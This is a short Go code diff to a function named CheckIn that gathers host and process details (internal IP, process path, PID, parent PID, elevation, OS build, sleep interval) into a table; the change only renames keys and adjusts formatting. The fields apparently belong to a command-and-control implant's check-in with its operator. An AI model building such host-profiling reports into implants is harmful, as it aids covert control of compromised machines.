@@ -44,18 +44,19 @@ func CheckIn(config *utils.Config) string {
 		"Domain": "",
 		"InternalIP": utils.FindNotLoopback(hostInfo.IPs),
 		"Process Path": procPath,
-		"Process ID": strconv.Itoa(procInfo.PID),
-		"Process Parent ID": strconv.Itoa(procInfo.PPID),
-		"Process Arch": "x64",
-		"Process Elevated": "0",
+		"PID": strconv.Itoa(procInfo.PID),
+		"PPID": strconv.Itoa(procInfo.PPID),
+		"Proc Arch": "x64",
+		"Proc Elevated": "0",
 		"OS Build": hostInfo.OS.Build,
 		"OS Arch": hostInfo.Architecture,
 		"Sleep": strconv.Itoa(config.SleepTime),
 		"Process Name": procInfo.Name,
 		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
 	}
+	// https://reintech.io/blog/a-guide-to-gos-text-tabwriter-package-aligning-text
 	var sb strings.Builder
-	writer := tabwriter.NewWriter(&sb, 0, 8, 1, '\t', tabwriter.AlignRight)
+	writer := tabwriter.NewWriter(&sb, 0, 0, 2, ' ', 0)
 
 	for k, v := range registerDict {
 		fmt.Fprintf(writer, "%s\t%s\n", k, v)
